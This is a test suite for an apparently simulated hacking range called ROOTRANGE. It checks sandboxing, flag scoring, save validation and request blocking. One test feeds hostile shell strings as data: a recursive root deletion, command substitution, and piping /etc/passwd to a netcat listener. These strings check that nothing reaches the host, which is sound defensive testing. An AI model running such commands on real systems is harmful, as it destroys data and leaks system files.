import { describe, it, expect, beforeEach, vi } from 'vitest';
import { SimulationEngine } from '../simulation/simulationEngine';
import { CommandRegistry, ExecutionContext } from '../services/commandRegistry';
import { CommandInterpreter } from '../services/commandInterpreter';
import { VirtualFileSystem } from '../services/virtualFs';
import { ShellParser } from '../services/shellParser';
import { useGameStore } from '../store/gameStore';
import { PersistenceService } from '../services/persistenceService';
import { FlagRegistry } from '../services/flagRegistry';
import { buildAttackGraphTopology } from '../simulation/attackGraphTopology';
import { ExternalAiAdapterProvider } from '../services/ai/externalAiProvider';

describe('ROOTRANGE Phase 11: Security Hardening, Testing, Performance, and Regression Fixes', () => {
  let engine: SimulationEngine;
  let fs: VirtualFileSystem;
  let ctx: ExecutionContext;

  beforeEach(() => {
    engine = SimulationEngine.getInstance();
    engine.resetRange();
    useGameStore.getState().resetGame();

    fs = new VirtualFileSystem();
    ctx = {
      user: 'kali',
      uid: 1000,
      group: 'kali',
      gid: 1000,
      groups: ['kali'],
      hostname: 'pwnbox',
      cwd: '/home/kali',
      env: { USER: 'kali', HOME: '/home/kali', PATH: '/usr/local/bin:/usr/bin:/bin' },
      fs,
      stdin: '',
      history: [],
      activeTarget: null,
      inReverseShell: false,
    };
  });

  // =========================================================================
  // SCENARIO 1: Command Affects Expected Machine & No Unrelated Machine
  // =========================================================================
  describe('Regression 1: Command Machine Scope Isolation', () => {
    it('discovers ports strictly on the targeted machine and leaves others untouched', () => {
      // Execute nmap against E-Corp HR
      const nmapHandler = CommandRegistry.get('nmap')!;
      const res = nmapHandler(['-sV', '10.10.11.45'], ctx);

      expect(res.exitCode).toBe(0);
      expect(res.stdout).toContain('Apache/2.4.49 (Log4j / Spring)');

      // E-Corp HR ports should be discovered
      const ecorpPorts = engine.getDiscoveredPorts('ecorp-hr');
      expect(ecorpPorts.length).toBeGreaterThan(0);
      expect(ecorpPorts).toContain(80);

      // IronBank Vault and Corp-DC01 must NOT have any ports discovered
      const ironPorts = engine.getDiscoveredPorts('iron-vault');
      expect(ironPorts.length).toBe(0);

      const dcPorts = engine.getDiscoveredPorts('corp-dc01');
      expect(dcPorts.length).toBe(0);
    });

    it('resetting one target machine does not affect state or objectives of other machines', () => {
      engine.completeObjective('ecorp-hr', 'ecorp-obj-1');
      engine.completeObjective('iron-vault', 'iron-obj-1');

      // Reset only iron-vault
      useGameStore.getState().resetMachine('iron-vault');

      // E-Corp HR objective must remain completed
      const ecorpObj1 = engine.getObjectives('ecorp-hr').find((o) => o.id === 'ecorp-obj-1');
      expect(ecorpObj1?.completed).toBe(true);

      // IronBank objective must be reset
      const ironObj1 = engine.getObjectives('iron-vault').find((o) => o.id === 'iron-obj-1');
      expect(ironObj1?.completed).toBe(false);
    });
  });

  // =========================================================================
  // SCENARIO 2: Discovered Services Represented Correctly in Graph
  // =========================================================================
  describe('Regression 2: Graph-State Service Synchronization', () => {
    it('accurately derives discovered services only on the respective machine node', () => {
      // Initially, no ports discovered on E-Corp HR
      let topology = buildAttackGraphTopology(engine);
      let ecorpNode = topology.nodes.find((n) => n.id === 'ecorp-hr');
      expect(ecorpNode?.data.discoveredPorts.length).toBe(0);

      // Discover port 80 on E-Corp HR
      engine.discoverPort('ecorp-hr', 80);

      topology = buildAttackGraphTopology(engine);
      ecorpNode = topology.nodes.find((n) => n.id === 'ecorp-hr');
      expect(ecorpNode?.data.discoveredPorts.some((p) => p.port === 80)).toBe(true);

      // IronBank node must still have zero discovered ports
      const ironNode = topology.nodes.find((n) => n.id === 'iron-vault');
      expect(ironNode?.data.discoveredPorts.length).toBe(0);
    });
  });

  // =========================================================================
  // SCENARIO 3: Challenge Prerequisites Cannot Be Bypassed Directly
  // =========================================================================
  describe('Regression 3: Challenge Prerequisite Enforcement', () => {
    it('rejects direct objective completion when prerequisites are unmet', () => {
      // Attempt to directly complete ecorp-obj-4 (Foothold) without ecorp-obj-3
      const result = engine.completeObjective('ecorp-hr', 'ecorp-obj-4');
      expect(result.success).toBe(false);
      expect(result.error).toContain('Prerequisite objectives must be completed first');

      const obj4 = engine.getObjectives('ecorp-hr').find((o) => o.id === 'ecorp-obj-4');
      expect(obj4?.completed).toBe(false);
    });

    it('blocks network access to isolated internal subnets without upstream pivot foothold', () => {
      // Ensure ecorp-hr has no compromise foothold
      engine.setMachineCompromiseLevel('ecorp-hr', 'NONE');
      engine.setActiveMachineId(undefined);

      // Attempt to reach isolated IronBank Vault subnet
      const reachIron = engine.canReachIp('10.10.11.82');
      expect(reachIron.reachable).toBe(false);
      expect(reachIron.reason).toContain('Requires an initial foothold on pivot host');

      // Attempt to reach isolated Corp-DC01 subnet
      const reachDc = engine.canReachIp('10.10.11.99');
      expect(reachDc.reachable).toBe(false);
    });
  });

  // =========================================================================
  // SCENARIO 4: Protected Virtual Files Respect Simulated Permissions
  // =========================================================================
  describe('Regression 4: Virtual Filesystem Permission Enforcement', () => {
    it('strictly forbids unprivileged user from reading root-only protected files', () => {
      // /root/root.txt is mode 0600 root:root
      const readRes = fs.readFile('/root', 'root.txt', 1000, 1000);
      expect(readRes.success).toBe(false);
      expect(readRes.error).toContain('Permission denied');
    });

    it('strictly forbids unprivileged user from writing to root system directories', () => {
      // /etc/shadow is mode 0640 root:shadow
      const writeRes = fs.writeFile('/etc', 'shadow', 'tampered:hash', 1000, 1000);
      expect(writeRes.success).toBe(false);
      expect(writeRes.error).toContain('Permission denied');
    });

    it('allows root user (UID 0) to access protected files', () => {
      const readRes = fs.readFile('/root', 'root.txt', 0, 0);
      expect(readRes.success).toBe(true);
      expect(readRes.content).toContain('ROOTRANGE{');
    });
  });

  // =========================================================================
  // SCENARIO 5: Duplicate Flag Submissions Never Produce Duplicate Rewards
  // =========================================================================
  describe('Regression 5: Single-Award Guarantee for CTF Flags', () => {
    it('awards points on initial submission and rejects duplicate submissions with 0 points', () => {
      const { submitFlag } = useGameStore.getState();

      // Submit user flag first time
      const res1 = submitFlag('ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}');
      expect(res1.success).toBe(true);
      expect(res1.pointsAwarded).toBe(20);
      const scoreAfterFirst = useGameStore.getState().score;
      expect(scoreAfterFirst).toBe(20);

      // Submit the exact same flag second time
      const res2 = submitFlag('ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}');
      expect(res2.success).toBe(false);
      expect(res2.pointsAwarded).toBe(0);
      expect(res2.message).toContain('already been submitted');

      // Total score must remain 20
      expect(useGameStore.getState().score).toBe(20);
    });

    it('rejects completely invalid or hallucinated flag strings', () => {
      const { submitFlag } = useGameStore.getState();
      const res = submitFlag('ROOTRANGE{fake_hallucinated_flag_12345}');
      expect(res.success).toBe(false);
      expect(res.pointsAwarded).toBe(0);
      expect(res.message).toContain('Invalid flag token');
    });
  });

  // =========================================================================
  // SCENARIO 6: Refreshing the Application Restores Valid Progress
  // =========================================================================
  describe('Regression 6: State Restoration & Hydration', () => {
    it('serializes and hydrates store state accurately via PersistenceService', async () => {
      useGameStore.getState().submitFlag('ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}');
      useGameStore.getState().updateCompromiseLevel('ecorp-hr', 'USER');

      // Export state
      const exported = useGameStore.getState().exportState();
      expect(exported.score).toBe(20);
      expect(exported.claimedFlags).toContain('ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}');

      // Save via PersistenceService
      await PersistenceService.saveState(exported);

      // Reset in-memory state only (simulating browser reload before hydration)
      useGameStore.setState({
        score: 0,
        claimedFlags: [],
        rank: 'Script Kiddie',
      });
      expect(useGameStore.getState().score).toBe(0);

      // Hydrate
      await useGameStore.getState().hydrateFromPersistence();
      expect(useGameStore.getState().score).toBe(20);
      expect(useGameStore.getState().claimedFlags).toContain('ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}');
    });
  });

  // =========================================================================
  // SCENARIO 7: Invalid Imported Saves Are Rejected Safely
  // =========================================================================
  describe('Regression 7: Schema Validation & Malicious Save Rejection', () => {
    it('rejects corrupted JSON or non-JSON payloads', () => {
      const res = PersistenceService.importStateFromJson('{ corrupted_invalid_json: true, ');
      expect(res.valid).toBe(false);
      expect(res.error).toContain('JSON parse failure');
    });

    it('rejects save files with unsupported versions', () => {
      const res = PersistenceService.validateSaveState({
        version: 99,
        timestamp: Date.now(),
        score: 100,
        rank: 'Hacker',
        claimedFlags: [],
        unlockedAchievements: [],
        machines: [],
      });
      expect(res.valid).toBe(false);
      expect(res.error).toContain('Unsupported save schema version: 99');
    });

    it('rejects save files with negative score', () => {
      const res = PersistenceService.validateSaveState({
        version: 1,
        timestamp: Date.now(),
        score: -50,
        rank: 'Script Kiddie',
        claimedFlags: [],
        unlockedAchievements: [],
        machines: [],
      });
      expect(res.valid).toBe(false);
      expect(res.error).toContain('"score" must be a non-negative number');
    });

    it('rejects save files with missing machines array', () => {
      const res = PersistenceService.validateSaveState({
        version: 1,
        timestamp: Date.now(),
        score: 50,
        rank: 'Hacker',
        claimedFlags: [],
        unlockedAchievements: [],
      });
      expect(res.valid).toBe(false);
      expect(res.error).toContain('"machines" must be an array');
    });
  });

  // =========================================================================
  // SCENARIO 8: Failed AI Requests Do Not Break Local Gameplay
  // =========================================================================
  describe('Regression 8: AI Adapter Fault Tolerance & Resilient Fallback', () => {
    it('handles network or API errors gracefully without throwing uncaught exceptions', async () => {
      // Mock global fetch to reject
      const originalFetch = globalThis.fetch;
      globalThis.fetch = vi.fn().mockRejectedValue(new Error('Connection refused: 11434'));

      const provider = new ExternalAiAdapterProvider({
        type: 'ollama',
        baseUrl: 'http://localhost:11434',
        model: 'llama3',
      });

      const res = await provider.queryAssistant('How do I exploit Log4Shell?');
      expect(res.success).toBe(false);
      expect(res.error).toContain('Connection refused');

      // Local simulation engine must remain healthy
      expect(engine.getMachines().length).toBe(3);

      globalThis.fetch = originalFetch;
    });
  });

  // =========================================================================
  // SCENARIO 9: HTTP Repeater Cannot Send Arbitrary Network Requests
  // =========================================================================
  describe('Regression 9: HTTP Repeater Simulated Security Boundary', () => {
    it('blocks requests to localhost and 127.0.0.1 with 403 Security Boundary Violation', () => {
      const res = engine.handleHttpRequest('127.0.0.1', {
        method: 'GET',
        path: '/admin',
        headers: {},
      });

      expect(res.statusCode).toBe(403);
      expect(res.body).toContain('Security Boundary Violation');
      expect(res.headers['X-Security-Policy']).toBe('ROOTRANGE-Virtual-Isolation-Active');
    });

    it('blocks requests to cloud metadata service 169.254.169.254', () => {
      const res = engine.handleHttpRequest('169.254.169.254', {
        method: 'GET',
        path: '/latest/meta-data/',
        headers: {},
      });

      expect(res.statusCode).toBe(403);
      expect(res.body).toContain('Security Boundary Violation');
    });

    it('blocks arbitrary external internet domains', () => {
      const res = engine.handleHttpRequest('google.com', {
        method: 'GET',
        path: '/',
        headers: {},
      });

      expect(res.statusCode).toBe(403);
      expect(res.body).toContain('Security Boundary Violation');
    });

    it('allows valid simulated virtual target machines', () => {
      const res = engine.handleHttpRequest('10.10.11.45', {
        method: 'GET',
        path: '/',
        headers: {},
      });

      expect(res.statusCode).toBe(200);
      expect(res.body).toContain('E-Corp Employee Portal');
    });
  });

  // =========================================================================
  // SCENARIO 10: Resetting Challenge Updates Terminal, Graph, Objectives, and Flags
  // =========================================================================
  describe('Regression 10: Challenge and Range Reset Consistency', () => {
    it('completely restores machine compromise, ports, objectives, and flags on reset', () => {
      // Compromise ecorp-hr
      engine.discoverPort('ecorp-hr', 80);
      useGameStore.getState().submitFlag('ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}');
      useGameStore.getState().updateCompromiseLevel('ecorp-hr', 'USER');

      expect(useGameStore.getState().score).toBe(20);
      expect(useGameStore.getState().machines.find((m) => m.id === 'ecorp-hr')?.compromiseLevel).toBe('USER');

      // Reset machine
      useGameStore.getState().resetMachine('ecorp-hr');

      // Verified reset
      const resetStore = useGameStore.getState();
      expect(resetStore.score).toBe(0);
      expect(resetStore.claimedFlags).not.toContain('ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}');
      expect(resetStore.machines.find((m) => m.id === 'ecorp-hr')?.compromiseLevel).toBe('NONE');
      expect(engine.getDiscoveredPorts('ecorp-hr').length).toBe(0);
    });
  });

  // =========================================================================
  // SCENARIO 11: Invalid Shell Input Cannot Invoke Host Commands
  // =========================================================================
  describe('Regression 11: Virtual Shell Tokenizer & Host Sandboxing', () => {
    it('safely parses shell meta-characters and command injection strings as virtual tokens', () => {
      const maliciousInputs = [
        'cat /etc/passwd; rm -rf /',
        'echo $(id)',
        'cat `whoami`',
        'curl http://10.10.11.45 && reboot',
        'cat /etc/passwd | nc 10.10.14.22 4444',
      ];

      for (const input of maliciousInputs) {
        const parsed = ShellParser.parse(input);
        expect(parsed.commands.length).toBeGreaterThan(0);
        // Commands are tokenized without invoking any host system processes
        const res = CommandInterpreter.execute(input, ctx);
        expect(res).toBeDefined();
        expect(typeof res.output).toBe('string');
      }
    });

    it('returns 127 command not found for unknown commands without host execution', () => {
      const res = CommandInterpreter.execute('unregistered_dangerous_binary_xyz', ctx);
      expect(res.exitCode).toBe(127);
      expect(res.output.toLowerCase()).toContain('command not found');
    });
  });

  // =========================================================================
  // SCENARIO 12: Zero Real Credentials, Tokens, or Secrets
  // =========================================================================
  describe('Regression 12: Zero Leaked Credentials & Synthetic Secret Verification', () => {
    it('verifies all registered flags follow the synthetic ROOTRANGE{...} format', () => {
      const flags = FlagRegistry.getAllFlags();
      expect(flags.length).toBeGreaterThan(0);

      for (const flag of flags) {
        expect(flag.flag.startsWith('ROOTRANGE{')).toBe(true);
        expect(flag.flag.endsWith('}')).toBe(true);
        // Ensure no real API keys are in titles or descriptions
        expect(flag.flag).not.toMatch(/sk-[a-zA-Z0-9]{20,}/);
      }
    });
  });
});
